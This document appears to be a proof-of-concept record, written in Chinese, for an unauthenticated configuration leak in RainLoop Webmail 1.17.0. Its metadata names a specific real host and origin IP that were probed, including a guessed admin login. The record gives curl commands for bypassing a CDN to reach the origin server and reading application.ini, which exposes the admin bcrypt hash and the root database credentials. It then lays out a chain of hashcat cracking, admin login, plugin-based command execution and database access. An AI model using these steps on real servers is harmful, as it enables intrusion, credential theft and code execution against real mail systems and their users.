# RainLoop 1.17.0 data 目录未鉴权：/data/_data_/_default_/configs/application.ini 泄露 admin bcrypt 哈希与 PDO root 配置

- **code**: rainloop-1.17-data-config-application-ini-unauth-read
- **kind**: poc
- **category**: info-leak
- **component**: RainLoop Webmail 1.17.0（Plesk 托管）
- **versions**: 1.17.0
- **severity**: high
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: task#12 / finding_id=137（finding_checks.verdict=verified，status=confirmed），2026-11-11 17:35-17:40 GMT，本机 bash+curl 直连源站 92.205.178.49（--noproxy '*'，-k，Host: portal.endif.co.uk）：GET /data/_data_/_default_/configs/application.ini → HTTP/2 200、content-length 9127、last-modified 2023-07-24 09:32:59 GMT、x-powered-by PleskLin；正文含 admin_login = "admin"、admin_password = "$2y$10$…"（bcrypt）、pdo_dsn=mysql:host=127.0.0.1;port=3306;dbname=rainloop、pdo_user="root"、pdo_password=""、[version] current="1.17.0"；POST /?/Ajax/ Action=AdminLogin&Login=admin&Password=12345 → 200 {"Action":"AdminLogin","Result":false,"ErrorCode":101}（面板启用、动作被真实处理、非默认口令）。判定成立：匿名可读完整配置，取得 admin 口令哈希与 DB 凭据字段。
- **path**: pocs/rainloop-1.17-data-config-application-ini-unauth-read/rainloop_data_application_ini_unauth_read.md
- **tags**: rainloop, webmail, config-leak, bcrypt, plesk, admin-panel, application-ini
- **created_at**: 2026-11-11T17:52:21.972Z
- **engine**: https://portal.endif.co.uk（源站 92.205.178.49）

## 描述

RainLoop Webmail 1.17.x 的 data 目录未做访问控制：匿名 GET /data/_data_/_default_/configs/application.ini 即 200 返回完整配置（实测 9127 字节），内含 admin_login 与 admin_password 的 bcrypt 哈希、contacts.pdo_user/pdo_password（本例 root/空）、IMAP/SMTP/SSL 全量配置与精确版本。可离线跑 admin 口令 → 登录 /?admin → 安装插件包形成命令执行；配置也可辅助定位同源 Plesk 主机上的其它 vhost。

## 用法

```
1) 直连源站并保留正确 Host（Cloudflare 前置时必须绕过 CDN）：curl -sk --noproxy '*' -A "$UA" -H "Host: <vhost>" -D - "https://<origin-ip>/data/_data_/_default_/configs/application.ini" → 200 + INI 正文。
2) 判据：content-length 数千~万字节、x-powered-by: PleskLin、正文含 admin_login/admin_password（$2y$10$ bcrypt）、pdo_user/pdo_password、[version] current。
3) 面板验证：POST /?/Ajax/ Action=AdminLogin&Login=<admin_login>&Password=<guess> → {"Result":false,"ErrorCode":101} 表示面板启用且动作被处理（非默认口令）；Result:true 即进面板。
4) 拿哈希后 hashcat -m 3200 离线破解，再回登录；RainLoop 管理面板可装插件包（packages）→ 代码执行。pdo root/空口令若 MySQL 可从本机/SSRF 触达则直接读库。
5) 失败常见原因：经 CDN 打被缓存/拦截（需源站 IP + Host）、/data/ 返 403 但文件可读（目录禁列≠文件禁读，直接按已知路径请求文件）、版本路径差异、admin_password 为空。
```

## 正文

```
# RainLoop Webmail data 目录未鉴权 → application.ini 全量配置泄露

## 前置条件
- 目标为 RainLoop Webmail（1.17.x），常见于 Plesk 托管。
- 能直连源站 IP 并用目标 vhost 的 Host 头（Cloudflare 后的源站：curl -k + --noproxy '*'）。
- `/data/` 未做访问控制（目录禁列不等于文件禁读）。

## 1) 匿名读配置
```bash
curl -sk --noproxy '*' -A "$UA" -H "Host: <vhost>" -D - \
  "https://<origin-ip>/data/_data_/_default_/configs/application.ini"
```
命中判据：
- HTTP 200；`content-length` 数千~万字节（实测 9127）；
- `last-modified` 长期不变（配置多年未改）；`x-powered-by: PleskLin`；
- 正文为 INI：
```ini
admin_login = "admin"
admin_password = "$2y$10$<REDACTED>"   # bcrypt
...
pdo_dsn = "mysql:host=127.0.0.1;port=3306;dbname=rainloop"
pdo_user = "root"
pdo_password = ""
...
[version]
current = "1.17.0"
```

## 2) 管理面板可达性 + 口令是否默认
```bash
curl -sk --noproxy '*' -A "$UA" -H "Host: <vhost>" -X POST "https://<origin-ip>/?/Ajax/" \
  -d 'Action=AdminLogin&Login=admin&Password=<try-a-default>'
```
期望：
```json
{"Action":"AdminLogin","Result":false,"ErrorCode":101,"ErrorMessage":"","ErrorMessageAdditional":"","Time":12}
```
- `ErrorCode 101` = 鉴权失败但面板启用、动作被真实处理 → 拿泄露的 bcrypt 离线跑字典后再回此端点验证登录；
- `Result:true` = 直接进管理面板。

## 3) 拿配置后的利用链
- `admin_password` 是 bcrypt（`$2y$10$`）→ `hashcat -m 3200` 离线强度验证 → 登录 `/?admin`；
- RainLoop 1.17.x 管理面板可安装/激活插件包（packages）→ 命令执行面；
- `pdo_user=root` / `pdo_password` 空 → 若 MySQL `127.0.0.1:3306` 可从本机或 SSRF 触达，直接读库（RainLoop 库内另有邮箱用户表）；
- 配置中的域名/路径可辅助定位同源 Plesk 主机上的其它 vhost。

## 失败常见原因
- 经 CDN 打会被缓存/拦截 → 必须直连源站 IP 并保留正确 Host；
- `/data/` 返回 403 但文件可读 → 继续按已知路径直接请求文件；
- 路径随版本不同（`/data/_data_/_default_/configs/application.ini` 是 1.17 默认布局）；
- `admin_password` 为空 = 面板未设密码或走其它认证方式。
```
